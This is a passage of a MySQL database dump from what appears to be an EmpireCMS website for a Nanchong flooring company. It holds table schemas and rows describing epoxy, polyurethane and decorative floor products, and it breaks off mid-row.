  `truetime` int(10) unsigned NOT NULL DEFAULT '0',
  `lastdotime` int(10) unsigned NOT NULL DEFAULT '0',
  `havehtml` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`),
  KEY `checked` (`checked`),
  KEY `newstime` (`newstime`),
  KEY `truetime` (`truetime`,`id`),
  KEY `havehtml` (`classid`,`truetime`,`havehtml`,`checked`,`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_info_doc_index`
--

LOCK TABLES `libang_ecms_info_doc_index` WRITE;
/*!40000 ALTER TABLE `libang_ecms_info_doc_index` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_info_doc_index` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_info_index`
--

DROP TABLE IF EXISTS `libang_ecms_info_index`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_info_index` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `checked` tinyint(1) NOT NULL DEFAULT '0',
  `newstime` int(10) unsigned NOT NULL DEFAULT '0',
  `truetime` int(10) unsigned NOT NULL DEFAULT '0',
  `lastdotime` int(10) unsigned NOT NULL DEFAULT '0',
  `havehtml` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`),
  KEY `checked` (`checked`),
  KEY `newstime` (`newstime`),
  KEY `truetime` (`truetime`,`id`),
  KEY `havehtml` (`classid`,`truetime`,`havehtml`,`checked`,`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_info_index`
--

LOCK TABLES `libang_ecms_info_index` WRITE;
/*!40000 ALTER TABLE `libang_ecms_info_index` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_info_index` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_infoclass_article`
--

DROP TABLE IF EXISTS `libang_ecms_infoclass_article`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_infoclass_article` (
  `classid` int(10) unsigned NOT NULL DEFAULT '0',
  `zz_title` text NOT NULL,
  `z_title` varchar(255) NOT NULL DEFAULT '',
  `qz_title` varchar(255) NOT NULL DEFAULT '',
  `save_title` varchar(10) NOT NULL DEFAULT '',
  `zz_titlepic` text NOT NULL,
  `z_titlepic` varchar(255) NOT NULL DEFAULT '',
  `qz_titlepic` varchar(255) NOT NULL DEFAULT '',
  `save_titlepic` varchar(10) NOT NULL DEFAULT '',
  `zz_newstime` text NOT NULL,
  `z_newstime` varchar(255) NOT NULL DEFAULT '',
  `qz_newstime` varchar(255) NOT NULL DEFAULT '',
  `save_newstime` varchar(10) NOT NULL DEFAULT '',
  `zz_ftitle` text NOT NULL,
  `z_ftitle` varchar(255) NOT NULL DEFAULT '',
  `qz_ftitle` varchar(255) NOT NULL DEFAULT '',
  `save_ftitle` varchar(10) NOT NULL DEFAULT '',
  `zz_smalltext` text NOT NULL,
  `z_smalltext` varchar(255) NOT NULL DEFAULT '',
  `qz_smalltext` varchar(255) NOT NULL DEFAULT '',
  `save_smalltext` varchar(10) NOT NULL DEFAULT '',
  `zz_writer` text NOT NULL,
  `z_writer` varchar(255) NOT NULL DEFAULT '',
  `qz_writer` varchar(255) NOT NULL DEFAULT '',
  `save_writer` varchar(10) NOT NULL DEFAULT '',
  `zz_befrom` text NOT NULL,
  `z_befrom` varchar(255) NOT NULL DEFAULT '',
  `qz_befrom` varchar(255) NOT NULL DEFAULT '',
  `save_befrom` varchar(10) NOT NULL DEFAULT '',
  `zz_newstext` text NOT NULL,
  `z_newstext` varchar(255) NOT NULL DEFAULT '',
  `qz_newstext` varchar(255) NOT NULL DEFAULT '',
  `save_newstext` varchar(10) NOT NULL DEFAULT '',
  `zz_diggtop` text NOT NULL,
  `z_diggtop` varchar(255) NOT NULL DEFAULT '',
  `qz_diggtop` varchar(255) NOT NULL DEFAULT '',
  `save_diggtop` varchar(10) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_infoclass_article`
--

LOCK TABLES `libang_ecms_infoclass_article` WRITE;
/*!40000 ALTER TABLE `libang_ecms_infoclass_article` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_infoclass_article` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_infoclass_info`
--

DROP TABLE IF EXISTS `libang_ecms_infoclass_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_infoclass_info` (
  `classid` int(10) unsigned NOT NULL DEFAULT '0',
  `zz_title` text NOT NULL,
  `z_title` varchar(255) NOT NULL DEFAULT '',
  `qz_title` varchar(255) NOT NULL DEFAULT '',
  `save_title` varchar(10) NOT NULL DEFAULT '',
  `zz_titlepic` text NOT NULL,
  `z_titlepic` varchar(255) NOT NULL DEFAULT '',
  `qz_titlepic` varchar(255) NOT NULL DEFAULT '',
  `save_titlepic` varchar(10) NOT NULL DEFAULT '',
  `zz_newstime` text NOT NULL,
  `z_newstime` varchar(255) NOT NULL DEFAULT '',
  `qz_newstime` varchar(255) NOT NULL DEFAULT '',
  `save_newstime` varchar(10) NOT NULL DEFAULT '',
  `zz_smalltext` text NOT NULL,
  `z_smalltext` varchar(255) NOT NULL DEFAULT '',
  `qz_smalltext` varchar(255) NOT NULL DEFAULT '',
  `save_smalltext` varchar(10) NOT NULL DEFAULT '',
  `zz_myarea` text NOT NULL,
  `z_myarea` varchar(255) NOT NULL DEFAULT '',
  `qz_myarea` varchar(255) NOT NULL DEFAULT '',
  `save_myarea` varchar(10) NOT NULL DEFAULT '',
  `zz_email` text NOT NULL,
  `z_email` varchar(255) NOT NULL DEFAULT '',
  `qz_email` varchar(255) NOT NULL DEFAULT '',
  `save_email` varchar(10) NOT NULL DEFAULT '',
  `zz_mycontact` text NOT NULL,
  `z_mycontact` varchar(255) NOT NULL DEFAULT '',
  `qz_mycontact` varchar(255) NOT NULL DEFAULT '',
  `save_mycontact` varchar(10) NOT NULL DEFAULT '',
  `zz_address` text NOT NULL,
  `z_address` varchar(255) NOT NULL DEFAULT '',
  `qz_address` varchar(255) NOT NULL DEFAULT '',
  `save_address` varchar(10) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_infoclass_info`
--

LOCK TABLES `libang_ecms_infoclass_info` WRITE;
/*!40000 ALTER TABLE `libang_ecms_infoclass_info` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_infoclass_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_infoclass_news`
--

DROP TABLE IF EXISTS `libang_ecms_infoclass_news`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_infoclass_news` (
  `classid` int(10) unsigned NOT NULL DEFAULT '0',
  `zz_title` text NOT NULL,
  `z_title` varchar(255) NOT NULL DEFAULT '',
  `qz_title` varchar(255) NOT NULL DEFAULT '',
  `save_title` varchar(10) NOT NULL DEFAULT '',
  `zz_titlepic` text NOT NULL,
  `z_titlepic` varchar(255) NOT NULL DEFAULT '',
  `qz_titlepic` varchar(255) NOT NULL DEFAULT '',
  `save_titlepic` varchar(10) NOT NULL DEFAULT '',
  `zz_newstime` text NOT NULL,
  `z_newstime` varchar(255) NOT NULL DEFAULT '',
  `qz_newstime` varchar(255) NOT NULL DEFAULT '',
  `save_newstime` varchar(10) NOT NULL DEFAULT '',
  `zz_ftitle` text NOT NULL,
  `z_ftitle` varchar(255) NOT NULL DEFAULT '',
  `qz_ftitle` varchar(255) NOT NULL DEFAULT '',
  `save_ftitle` varchar(10) NOT NULL DEFAULT '',
  `zz_smalltext` text NOT NULL,
  `z_smalltext` varchar(255) NOT NULL DEFAULT '',
  `qz_smalltext` varchar(255) NOT NULL DEFAULT '',
  `save_smalltext` varchar(10) NOT NULL DEFAULT '',
  `zz_writer` text NOT NULL,
  `z_writer` varchar(255) NOT NULL DEFAULT '',
  `qz_writer` varchar(255) NOT NULL DEFAULT '',
  `save_writer` varchar(10) NOT NULL DEFAULT '',
  `zz_befrom` text NOT NULL,
  `z_befrom` varchar(255) NOT NULL DEFAULT '',
  `qz_befrom` varchar(255) NOT NULL DEFAULT '',
  `save_befrom` varchar(10) NOT NULL DEFAULT '',
  `zz_newstext` text NOT NULL,
  `z_newstext` varchar(255) NOT NULL DEFAULT '',
  `qz_newstext` varchar(255) NOT NULL DEFAULT '',
  `save_newstext` varchar(10) NOT NULL DEFAULT '',
  `zz_diggtop` text NOT NULL,
  `z_diggtop` varchar(255) NOT NULL DEFAULT '',
  `qz_diggtop` varchar(255) NOT NULL DEFAULT '',
  `save_diggtop` varchar(10) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_infoclass_news`
--

LOCK TABLES `libang_ecms_infoclass_news` WRITE;
/*!40000 ALTER TABLE `libang_ecms_infoclass_news` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_infoclass_news` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_infotmp_article`
--

DROP TABLE IF EXISTS `libang_ecms_infotmp_article`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_infotmp_article` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `classid` int(10) unsigned NOT NULL DEFAULT '0',
  `oldurl` varchar(200) NOT NULL DEFAULT '',
  `checked` tinyint(1) NOT NULL DEFAULT '0',
  `tmptime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `userid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `username` varchar(20) NOT NULL DEFAULT '',
  `truetime` int(10) unsigned NOT NULL DEFAULT '0',
  `keyboard` varchar(100) NOT NULL DEFAULT '',
  `title` varchar(100) NOT NULL DEFAULT '',
  `newstime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `titlepic` varchar(120) NOT NULL DEFAULT '',
  `ftitle` varchar(120) NOT NULL DEFAULT '',
  `smalltext` varchar(255) NOT NULL DEFAULT '',
  `writer` varchar(30) NOT NULL DEFAULT '',
  `befrom` varchar(60) NOT NULL DEFAULT '',
  `newstext` mediumtext NOT NULL,
  `diggtop` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`),
  KEY `checked` (`checked`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_infotmp_article`
--

LOCK TABLES `libang_ecms_infotmp_article` WRITE;
/*!40000 ALTER TABLE `libang_ecms_infotmp_article` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_infotmp_article` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_infotmp_info`
--

DROP TABLE IF EXISTS `libang_ecms_infotmp_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_infotmp_info` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `classid` int(10) unsigned NOT NULL DEFAULT '0',
  `oldurl` varchar(200) NOT NULL DEFAULT '',
  `checked` tinyint(1) NOT NULL DEFAULT '0',
  `tmptime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `userid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `username` varchar(20) NOT NULL DEFAULT '',
  `truetime` int(10) unsigned NOT NULL DEFAULT '0',
  `keyboard` varchar(100) NOT NULL DEFAULT '',
  `title` varchar(100) NOT NULL DEFAULT '',
  `newstime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `titlepic` varchar(120) NOT NULL DEFAULT '',
  `smalltext` text NOT NULL,
  `myarea` varchar(30) NOT NULL DEFAULT '',
  `email` varchar(80) NOT NULL DEFAULT '',
  `mycontact` varchar(255) NOT NULL DEFAULT '',
  `address` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`),
  KEY `checked` (`checked`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_infotmp_info`
--

LOCK TABLES `libang_ecms_infotmp_info` WRITE;
/*!40000 ALTER TABLE `libang_ecms_infotmp_info` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_infotmp_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_infotmp_news`
--

DROP TABLE IF EXISTS `libang_ecms_infotmp_news`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_infotmp_news` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `classid` int(10) unsigned NOT NULL DEFAULT '0',
  `oldurl` varchar(200) NOT NULL DEFAULT '',
  `checked` tinyint(1) NOT NULL DEFAULT '0',
  `tmptime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `userid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `username` varchar(20) NOT NULL DEFAULT '',
  `truetime` int(10) unsigned NOT NULL DEFAULT '0',
  `keyboard` varchar(100) NOT NULL DEFAULT '',
  `title` varchar(100) NOT NULL DEFAULT '',
  `newstime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `titlepic` varchar(120) NOT NULL DEFAULT '',
  `ftitle` varchar(120) NOT NULL DEFAULT '',
  `smalltext` varchar(255) NOT NULL DEFAULT '',
  `writer` varchar(30) NOT NULL DEFAULT '',
  `befrom` varchar(60) NOT NULL DEFAULT '',
  `newstext` mediumtext NOT NULL,
  `diggtop` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`),
  KEY `checked` (`checked`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_infotmp_news`
--

LOCK TABLES `libang_ecms_infotmp_news` WRITE;
/*!40000 ALTER TABLE `libang_ecms_infotmp_news` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_ecms_infotmp_news` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_ecms_news`
--

DROP TABLE IF EXISTS `libang_ecms_news`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_ecms_news` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `ttid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `onclick` int(10) unsigned NOT NULL DEFAULT '0',
  `plnum` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `totaldown` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `newspath` char(20) NOT NULL DEFAULT '',
  `filename` char(36) NOT NULL DEFAULT '',
  `userid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `username` char(20) NOT NULL DEFAULT '',
  `firsttitle` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `isgood` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `ispic` tinyint(1) NOT NULL DEFAULT '0',
  `istop` tinyint(1) NOT NULL DEFAULT '0',
  `isqf` tinyint(1) NOT NULL DEFAULT '0',
  `ismember` tinyint(1) NOT NULL DEFAULT '0',
  `isurl` tinyint(1) NOT NULL DEFAULT '0',
  `truetime` int(10) unsigned NOT NULL DEFAULT '0',
  `lastdotime` int(10) unsigned NOT NULL DEFAULT '0',
  `havehtml` tinyint(1) NOT NULL DEFAULT '0',
  `groupid` smallint(6) NOT NULL DEFAULT '0',
  `userfen` smallint(5) unsigned NOT NULL DEFAULT '0',
  `titlefont` char(14) NOT NULL DEFAULT '',
  `titleurl` char(200) NOT NULL DEFAULT '',
  `stb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `fstb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `restb` tinyint(3) unsigned NOT NULL DEFAULT '1',
  `keyboard` char(80) NOT NULL DEFAULT '',
  `title` char(100) NOT NULL DEFAULT '',
  `newstime` int(10) unsigned NOT NULL DEFAULT '0',
  `titlepic` char(120) NOT NULL DEFAULT '',
  `eckuid` int(11) NOT NULL DEFAULT '0',
  `ftitle` char(120) NOT NULL DEFAULT '',
  `smalltext` char(255) NOT NULL DEFAULT '',
  `diggtop` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `classid` (`classid`),
  KEY `newstime` (`newstime`),
  KEY `ttid` (`ttid`),
  KEY `firsttitle` (`firsttitle`),
  KEY `isgood` (`isgood`),
  KEY `ispic` (`ispic`),
  KEY `useridis` (`userid`,`ismember`)
) ENGINE=MyISAM AUTO_INCREMENT=184 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_ecms_news`
--

LOCK TABLES `libang_ecms_news` WRITE;
/*!40000 ALTER TABLE `libang_ecms_news` DISABLE KEYS */;
INSERT INTO `libang_ecms_news` VALUES (1,12,0,0,0,0,'','index',1,'admin',0,0,0,0,0,0,0,1586932415,1587022767,1,0,0,'','/gywm/gsjj/index.html',1,1,1,'','公司简介',1586932383,'',0,'','企业简介：\r\n南充市丽邦装饰工程有限公司，是一家集设计、营销、安装、客服、施工团队为一体，为客户提供一站式服务的专业品牌的康体企业，一直致力于打造&ldquo;你的满意我们的无限',0),(180,20,0,0,0,0,'','180',1,'admin',0,0,1,0,0,0,0,1646374836,1646375054,1,0,0,'','/gssl/ryzz/180.html',1,1,1,'','资质3',1646374818,'/d/file/bd5bd14b1b4616ed0f062a4e65911ba9.jpg',0,'','',0),(73,21,0,0,0,0,'','73',1,'admin',0,0,1,0,0,0,0,1587006698,1587006698,1,0,0,'','/gssl/hzhb/73.html',1,1,1,'','华侨城',1587006655,'/d/file/a08f21813a437c6b14ed399874a3bb1a.jpg',0,'','',0),(4,6,0,0,0,0,'','index',1,'admin',0,0,0,0,0,0,0,1586932489,1593483506,1,0,0,'','/lxwm/index.html',1,1,1,'','联系我们',1586932479,'',0,'','南充市丽邦装饰工程有限公司\r\n电话：0817-3618388\r\n热线：15196780978（王总）\r\n售后服务：0817-3618388\r\n邮编：637000\r\n邮箱：1024957682@qq.com\r\n网址：http://www.sclbdp.com\r\n地址：四川省南充市川东北金融广场五栋18-22号',0),(5,7,0,0,0,0,'','5',1,'admin',0,0,1,0,0,0,0,1586934690,1586934843,1,0,0,'','/cpzx/gnxdp/5.html',1,1,1,'','彩色混凝土密封固化剂地坪',1586934466,'/d/file/29a98297c1ceaa3580951a85d8dca2fd.jpg',0,'','适用范围：1、各类厂房、机械厂、化工厂、食品饮料厂、电子制品厂、污水处理厂、制药厂、冷库、棉纺厂等；2、各类库房、地下停车场、飞机库、汽车4S店、物流中心、大型卖场等',0),(6,7,0,0,0,0,'','6',1,'admin',0,0,1,0,0,0,0,1586934829,1586934829,1,0,0,'','/cpzx/gnxdp/6.html',1,1,1,'','金刚砂耐磨地坪',1586934692,'/d/file/18ab1311f20a094caa390b1416acc127.jpg',0,'','适用范围：适用于广场、机场、仓库、停车场、商场、超市、重载机械厂、汽车维修厂等各类厂房。性能特点：1、硬度高、耐磨性好；2、可长期承受重载；3、不易起尘，造价低廉。施工工艺：1',0),(7,7,0,0,0,0,'','7',1,'admin',0,0,1,0,0,0,0,1586934874,1586934874,1,0,0,'','/cpzx/gnxdp/7.html',1,1,1,'','超平混泥土地坪',1586934847,'/d/file/c9a351a418f3bd49eeca48ac182bc66c.jpg',0,'','适用范围：大型仓储中心、物流中心、零售业的综合配送中心、超窄巷道仓库、铁道运输储备中心、货运码头、电视节目演播室、溜冰场、使用精密仪器、设备的生产车间等对地面要求',0),(8,7,0,0,0,0,'','8',1,'admin',0,0,1,0,0,0,0,1586934910,1586934910,1,0,0,'','/cpzx/gnxdp/8.html',1,1,1,'','卷材片材类地板',1586934876,'/d/file/4ffdb9f1c06950b92535529219f5b210.jpg',0,'','适用范围：学校、医院、办公、工厂、商场、汽车、船舶、地铁、火车、家居、实验室、试验室、科研、楼梯、养老院、图书馆、影剧院等各种场所。性能特点：适用范围广；耐污、抗酸碱',0),(9,7,0,0,0,0,'','9',1,'admin',0,0,1,0,0,0,0,1586934939,1586934939,1,0,0,'','/cpzx/gnxdp/9.html',1,1,1,'','纳米硅地坪',1586934912,'/d/file/a5afd1723cdfe59e9bd499eeef3054d0.jpg',0,'','产品介绍：水性纳米硅颜色面料乳液(双组份)，是采用百分之七十八的水性聚氨酯和纳米级的无机硅类矿物材料精制而成，纳米硅粉具有纯度高，粒径小、分布均匀、无毒无味、防火、活性好',0),(10,7,0,0,0,0,'','10',1,'admin',0,0,1,0,0,0,0,1586934966,1586934966,1,0,0,'','/cpzx/gnxdp/10.html',1,1,1,'','不发火防静电耐磨地坪',1586934941,'/d/file/b05184518ca10ee519ec66027cbc85e8.jpg',0,'','适用范围不发火防静电耐磨地坪主要用于电子、航天、通讯、计算机、精密仪器等一切要求洁净、不发火且防静电的厂房车间地面。性能特点1、具有卓越耐磨性、抗冲击性、高抗压',0),(11,7,0,0,0,0,'','11',1,'admin',0,0,1,0,0,0,0,1586935016,1586935016,1,0,0,'','/cpzx/gnxdp/11.html',1,1,1,'','聚氨酯砂浆自流平地坪',1586934968,'/d/file/3c844038923a956acfd443deaea4ba01.jpg',0,'','适用范围：超高压电气、制药、化学品、低温冷库、食品加工厂、奶制品厂、酿酒厂和重载荷强冲击的极端工业环境下使用。性能特点：1、抗压强度、抗折强度尤其是抗冲击性能突出；坚',0),(12,7,0,0,0,0,'','12',1,'admin',0,0,1,0,0,0,0,1586935041,1586935041,1,0,0,'','/cpzx/gnxdp/12.html',1,1,1,'','聚氨酯自流平地坪',1586935018,'/d/file/5cdd1aba0417efab470b71967b72fcd9.jpg',0,'','适用范围：适用于对地面的美观、舒适有较高要求的场合，适应于对地坪的弹性、耐磨性、耐冲击性有较高要求的场合，适合于对地坪的耐化学品性能有较高要求的场合。性能特点：1、耐强',0),(13,7,0,0,0,0,'','13',1,'admin',0,0,1,0,0,0,0,1586935276,1586935276,1,0,0,'','/cpzx/gnxdp/13.html',1,1,1,'','聚氨酯耐磨地坪',1586935043,'/d/file/ab6959c5f1f1f1fd05a332f9bc0f4f22.jpg',0,'','使用范围：环氧树脂地坪密封层和需要高耐磨地面的重交通区。性能特点：1、高固含量；2、优异的耐磨损，抗冲击性能；3、很好的耐UV性能，无黄变；4、纹理表面；5、很好的抗化学性能；6、透明色',0),(14,7,0,0,0,0,'','14',1,'admin',0,0,1,0,0,0,0,1586935317,1586935317,1,0,0,'','/cpzx/gnxdp/14.html',1,1,1,'','乙烯基酯重防腐地坪',1586935278,'/d/file/195059b1c5d82b4a0af11e6b741b19be.jpg',0,'','适用范围：特别适用于重防腐要求的作业面和工作场所，如强酸、碱池排污沟槽等作业环境。性能特点：1、耐高温，抗疲劳，优异的机械性能和韧性；2、自由调配固化时间，粘度低，易施工；3、低温',0),(15,7,0,0,0,0,'','15',1,'admin',0,0,1,0,0,0,0,1586935341,1586935341,1,0,0,'','/cpzx/gnxdp/15.html',1,1,1,'','聚脲防水防腐地坪',1586935319,'/d/file/d4793f1e376aeb17153037138705232d.jpg',0,'','适用范围：聚脲耐磨地坪是一种专门针对混凝土地面设计的新型的具有一定弹性的双组份防腐耐磨地坪。用于混凝土的防护，特别适用于工期紧、防护强度要求高的地坪涂装工程，广泛用于',0),(16,8,0,0,0,0,'','16',1,'admin',0,0,1,0,0,0,0,1586935453,1586935453,1,0,0,'','/cpzx/hydp/16.html',1,1,1,'','环氧微珠耐磨地坪',1586935418,'/d/file/2a0f3cb7ec582d5a123675b393ca91fa.jpg',0,'','适用范围室内外车库、工业厂房、食品厂等要求 防水、耐候性好的区域以及坏旧环氧地坪修补。性能特点1、优良的耐候性和耐水性,尤其适合用于户外使用;2、涂层具有良好的耐磨',0),(17,8,0,0,0,0,'','17',1,'admin',0,0,1,0,0,0,0,1586935478,1586935478,1,0,0,'','/cpzx/hydp/17.html',1,1,1,'','水性环氧地坪',1586935455,'/d/file/bf905ee6d39eed46edace50aa0d86ca4.jpg',0,'','适用范围：电子、电器、食品、制药厂等无尘洁净车间。性能特点：1、环保无毒、流平性好、表面平滑美观；2、透湿气性好，可在潮湿环境中施工，不起泡；3、耐弱酸、弱碱、盐类等化学品腐',0),(18,8,0,0,0,0,'','18',1,'admin',0,0,1,0,0,0,0,1586935508,1586935508,1,0,0,'','/cpzx/hydp/18.html',1,1,1,'','环氧防静电地坪',1586935480,'/d/file/35a9cd3ad21c34e384708062b4307035.jpg',0,'','适用范围：特别适用于航空航天、计算机房、电子企业、军工企业、水坝控制中心以及各种易燃易爆厂房地面。性能特点：1、抗压抗冲击、强度高、韧性好；2、电阻值105-109&amp;Omega;，防静',0),(19,8,0,0,0,0,'','19',1,'admin',0,0,1,0,0,0,0,1586935549,1586935549,1,0,0,'','/cpzx/hydp/19.html',1,1,1,'','环氧自流平地坪',1586935529,'/d/file/a4ef94ba849f5b4b8f17a53cb006bd8f.jpg',0,'','适用范围：适用于实行GMP标准的制药行业、血液制品行业、医疗行业、生物研究、电子及微电子行业的无尘室或者无菌室。同样也可用于要求美观、耐磨、抗冲击、防化学品的其它行',0),(20,8,0,0,0,0,'','20',1,'admin',0,0,1,0,0,0,0,1586935576,1586935576,1,0,0,'','/cpzx/hydp/20.html',1,1,1,'','环氧砂浆平涂地坪',1586935551,'/d/file/526894272a2cb260346498c6a2134b83.jpg',0,'','适用范围：机械性能要求较高的区域，如要求耐磨性强、耐一定冲击的机械厂、五金厂、码头、车道、车库、工业厂房、汽车飞机修理厂等水泥或水磨石地面。性能特点：1、防尘、防潮、',0),(21,9,0,0,0,0,'','21',1,'admin',0,0,1,0,0,0,0,1586935723,1586935723,1,0,0,'','/cpzx/gdsydp/21.html',1,1,1,'','3D艺术地坪',1586935687,'/d/file/d24c3d3415845fc1a2cf3a14fac358f0.jpg',0,'','适用范围1、地坪罩面:磨石地坪、撒花地坪、彩砂地坪、大理石地坪等;2、墙面罩面: KTV、展览馆、艺术中心等个性化铝扣板墙面;3、台面罩面:吧台、餐桌、会议桌等;4、艺术地坪',0),(22,9,0,0,0,0,'','22',1,'admin',0,0,1,0,0,0,0,1586935752,1586935752,1,0,0,'','/cpzx/gdsydp/22.html',1,1,1,'','艺术泼墨地坪',1586935725,'/d/file/9476742320f5f0337fd8622698b77fb7.jpg',0,'','适用范围：博物馆、展览馆、漫咖啡、酒吧、画廊、别墅、特色餐厅、潮牌服饰和会所茶社等场所，平面与立体空间的融合，交映成趣。性能特点：1、附着力超强，能有效附着在传统和非传统',0),(23,9,0,0,0,0,'','23',1,'admin',0,0,1,0,0,0,0,1586935791,1586935791,1,0,0,'','/cpzx/gdsydp/23.html',1,1,1,'','无机磨石',1586935755,'/d/file/d55a9df21fc06cdfd2f35d2d8e9d6b21.jpg',0,'','适用范围1、用水泥等无机矿物材料做骨料粘接剂的磨石系统叫无机磨石。2、广泛应用于地铁、学校、医院、商场、企事业单位、厂房、广场等。性能特点1、由水泥等无机矿物材料',0),(24,9,0,0,0,0,'','24',1,'admin',0,0,1,0,0,0,0,1586935814,1586935814,1,0,0,'','/cpzx/gdsydp/24.html',1,1,1,'','水泥自流平磨石地坪',1586935793,'/d/file/27b87cd5cfeca3fc4b76adc09bda98ea.jpg',0,'','适用范围：适用于酒店、办公室、服装店、商业品牌店面墙面等等。性能特点：1、具有优良的防水特性和自洁性；2、耐擦易洗，漆膜精致，色泽持久，外表细腻亮丽；3、绿色环保，不含有机物挥发',0),(25,9,0,0,0,0,'','25',1,'admin',0,0,1,0,0,0,0,1586935843,1586935843,1,0,0,'','/cpzx/gdsydp/25.html',1,1,1,'','复古地坪',1586935816,'/d/file/33952a337627372f2431e7f18f5a8d43.jpg',0,'','适用范围：适用于咖啡店，服装店，办公室，茶室，商业品牌店面地面等。性能特点：1、整体无缝，完全不起尘，极易清洁，可满足高洁净度工业厂房的要求；2、颜色可任意选择、搭配，美观度极佳；3、防',0),(26,9,0,0,0,0,'','26',1,'admin',0,0,1,0,0,0,0,1586935888,1586935888,1,0,0,'','/cpzx/gdsydp/26.html',1,1,1,'','彩色水泥自流平地坪',1586935845,'/d/file/3f7dd39e7f838195d54345344ccc0960.jpg',0,'','适用范围：食品加工厂、车库、停车A 